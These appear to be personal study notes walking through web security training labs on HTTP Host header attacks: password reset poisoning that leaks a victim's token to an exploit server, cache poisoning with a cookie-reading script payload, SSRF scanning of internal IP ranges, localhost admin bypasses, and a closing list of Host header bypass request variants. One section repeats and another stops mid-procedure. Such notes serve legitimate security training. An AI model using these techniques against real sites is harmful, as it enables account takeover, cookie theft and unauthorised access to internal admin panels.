## If /admin not found, try:

```
GET /admin HTTP/1.1
Host: 192.168.0.1
```

and u will see this hidden admin, even it was 404 before. See: `Host validation bypass via connection state attack` below to view full lab.

## Basic password reset poisoning

1) Investigate (do) full "Forgot your password?" functionality to your own account.
2) Notice that the POST /forgot-password request is used to trigger the password reset email. This contains the username whose password is being reset as a body parameter.
3) change the Host header to your exploit server's domain name (YOUR-EXPLOIT-SERVER-ID.exploit-server.net) and change the username parameter to carlos. Send the request.
4) Go to your exploit server and open the access log. You will see a request for GET /forgot-password with the temp-forgot-password-token parameter containing Carlos's password reset token.
5) Go to your email client and copy the genuine password reset URL from your first email. Visit this URL in the browser, but replace your reset token with the one you obtained from the access log.

## Host header authentication bypass

1) Go to the /robots.txt and observe that there is an admin panel at /admin.
2) Notice that /admin can be accessed by local users..
3) Change the Host header to localhost and send the request.


## Host header authentication bypass

1) Go to the /robots.txt and observe that there is an admin panel at /admin.
2) Notice that /admin can be accessed by local users..
3) Change the Host header to localhost and send the request.

## Web cache poisoning via ambiguous requests (x-Cache-hit)

1) Exploit server -> and create a file at `/resources/js/tracking.js` containing the payload `alert(document.cookie)`.
2)
   ```
    GET /?cb=123 HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    ```

## Routing-based SSRF

1) Set `Host: 192.168.0.§0§`; Payload -> numbers from 0 to 255 with step 1.
2) `GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`.
3) Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.
4) Right-click on your request and select Change request method. Burp will convert it to a `POST` request. Send.

## SSRF via flawed request parsing

1) Observe that you can also access the home page by supplying an absolute URL in the request line as follows:
`GET https://YOUR-LAB-ID.web-security-academy.net/`.
2) It means that its possible now to modify header:
   
   ```
   GET https://YOUR-LAB-ID.web-security-academy.net/
   Host: BURP-COLLABORATOR-SUBDOMAIN
   ```
3)  Go to Intruder and deselect Update Host header to match target. Use the Host header to scan the IP range 192.168.0.0/24.
4)  In Burp Repeater, append /admin to the absolute URL in the request line and send the request. Not you have access.

## Host validation bypass via connection state attack

1) Take `GET /` Request:
   Change the path to /admin.
   Change Host header to 192.168.0.1.
2) you are simply redirected to the homepage. Duplicate the tab, then add both tabs to a new group.
3) In the first tab:
   Change the path back to /.
   Change the Host header back to `YOUR-LAB-ID.h1-web-security-academy.net`.

4) Send `group in sequence (single connection)`. Change the Connection header to keep-alive.

## Bypasses:
```
localhost
Localhost
LocalHost
lOcAlhOsT
LOcalHOSt
```

```
Host: target.com
X-Forwarded-Host: admin.target.com
```

```
Host: admin.target.com
```

```
Host: target.com:80
```

```
GET /admin HTTP/1.0
```

```
Host: target.com
X-Original-Host: admin.target.com
```

```
Host: admin%2etarget.com
```

```
Host: target.com.exploit-server.com
```
